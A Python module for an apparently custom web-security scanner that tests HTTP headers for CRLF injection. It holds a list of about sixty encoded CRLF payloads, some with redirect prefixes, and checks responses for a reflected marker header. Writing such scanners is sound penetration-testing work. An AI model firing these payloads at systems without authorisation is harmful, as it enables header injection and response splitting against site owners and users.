
from pluck.core import BaseModule, PayloadInjector, Finding
import pluck.settings as settings
from httplib import HTTPRequest, HTTPResponse,  HTTPRequestSender
import issuelib as issuelib
import random, string



class CRLFInjectionTester(BaseModule):
    def __init__(self, request):
        super().__init__(request)
        self.name = "CRLF Injection Tester"
        self.test_parameters = []
        self.injection_points = ["headers"]
        self.excluded_parameters = []
        self.generator = None

        self.unique_string = self.generate_unique_string()
        
    def generate_requests(self, payloads):
        # Create an injector
        injector = PayloadInjector(HTTPRequest(self.original_request.rebuild_request()))
        
        # Injection dictionary létrehozása
        injection_dict = injector.find_injection_points() # This stores an injection dictionary
        
        # return back the points which have least 1 parameter
        available_injection_points = injector.get_available_injection_points()

        #print(f"Generating requests for: Points: {str(self.injection_points)} and Parameters: {str(self.test_parameters)}")
        #print("Available Injection Points: ", available_injection_points)
        #print("Excluded Parameters: ", self.excluded_parameters)
        #print("Available Parameters: ")

        request_list = []
        # Minden feladat hozzáadása a queue-hoz
        for point in self.injection_points:
            if point in available_injection_points:
                print(f"Parameters for {point}: ", ', '.join(injector.get_injection_parameters(point)))
                for key in injection_dict[point]:
                    if key not in self.excluded_parameters:
                        if len(self.test_parameters) == 0 or key in self.test_parameters:
                            for p in payloads:
                                new_request = HTTPRequest(self.original_request.rebuild_request())
                                injector = PayloadInjector(new_request)
                                injector.inject_payload(point, key, p)
                                request_list.append((p, point, key, new_request))

        return request_list
    
    def send_requests(self, request_list):

        for payload, point, key, req in request_list:
            response = self.sender.send_request(req)
            if self.analyze_response(response):
                print(f"[!] CRLF Injection Found in Point: {point} Parameter: {key}, Payload: {payload}. Request ID: {req.request_id}")
                break;

    def analyze_response(self, response):
        # check root in passwd
        response_headers = response.get_headers()
        if "Pluck" in response_headers:
            if response_headers["Pluck"] == self.unique_string:
                return True
        
        return False

    def generate_payloads(self):
        headers = ['%0APluck:UNIQUE', '%0A%20Pluck:UNIQUE', '%20%0APluck:UNIQUE', '%23%OAPluck:UNIQUE', '%E5%98%8A%E5%98%8DPluck:UNIQUE', 
                   '%E5%98%8A%E5%98%8D%0APluck:UNIQUE', '%3F%0APluck:UNIQUE', 'crlf%0APluck:UNIQUE', 'crlf%0A%20Pluck:UNIQUE', 'crlf%20%0APluck:UNIQUE', 
                   'crlf%23%OAPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8DPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8D%0APluck:UNIQUE', 'crlf%3F%0APluck:UNIQUE', 
                   '%0DPluck:UNIQUE', '%0D%20Pluck:UNIQUE', '%20%0DPluck:UNIQUE', '%23%0DPluck:UNIQUE', '%23%0APluck:UNIQUE', '%E5%98%8A%E5%98%8DPluck:UNIQUE', 
                   '%E5%98%8A%E5%98%8D%0DPluck:UNIQUE', '%3F%0DPluck:UNIQUE', 'crlf%0DPluck:UNIQUE', 'crlf%0D%20Pluck:UNIQUE', 'crlf%20%0DPluck:UNIQUE', 
                   'crlf%23%0DPluck:UNIQUE', 'crlf%23%0APluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8DPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8D%0DPluck:UNIQUE', 
                   'crlf%3F%0DPluck:UNIQUE', '%0D%0APluck:UNIQUE', '%0D%0A%20Pluck:UNIQUE', '%20%0D%0APluck:UNIQUE', '%23%0D%0APluck:UNIQUE', 
                   '\\r\\nPluck:UNIQUE', '\\r\\n Pluck:UNIQUE', '\\r\\n Pluck:UNIQUE', '%5cr%5cnPluck:UNIQUE', '%E5%98%8A%E5%98%8DPluck:UNIQUE', 
                   '%E5%98%8A%E5%98%8D%0D%0APluck:UNIQUE', '%3F%0D%0APluck:UNIQUE', 'crlf%0D%0APluck:UNIQUE', 'crlf%0D%0A%20Pluck:UNIQUE',
                     'crlf%20%0D%0APluck:UNIQUE', 'crlf%23%0D%0APluck:UNIQUE', 'crlf\\r\\nPluck:UNIQUE', 'crlf%5cr%5cnPluck:UNIQUE', 
                     'crlf%E5%98%8A%E5%98%8DPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8D%0D%0APluck:UNIQUE', 'crlf%3F%0D%0APluck:UNIQUE', '%0D%0A%09Pluck:UNIQUE', 
                     'crlf%0D%0A%09Pluck:UNIQUE', '%250APluck:UNIQUE', '%25250APluck:UNIQUE', '%%0A0APluck:UNIQUE', '%25%30APluck:UNIQUE', 
                     '%25%30%61Pluck:UNIQUE', '%u000APluck:UNIQUE', '//www.google.com/%2F%2E%2E%0D%0APluck:UNIQUE', '/www.google.com/%2E%2E%2F%0D%0APluck:UNIQUE', 
                     '/google.com/%2F..%0D%0APluck:UNIQUE']

        result = [h.replace("UNIQUE", self.unique_string) for h in headers]

        return result


    def generate_unique_string(self, length=16):
        return ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(length))

    def run(self):
         # Generate payloads
        print(f"[*] Executing the {self.name} module")
        payloads = self.generate_payloads()

        generated_requests = self.generate_requests(payloads)

        #print("Generated Requests Count: "+ str(len(generated_requests)))
        self.send_requests(generated_requests)


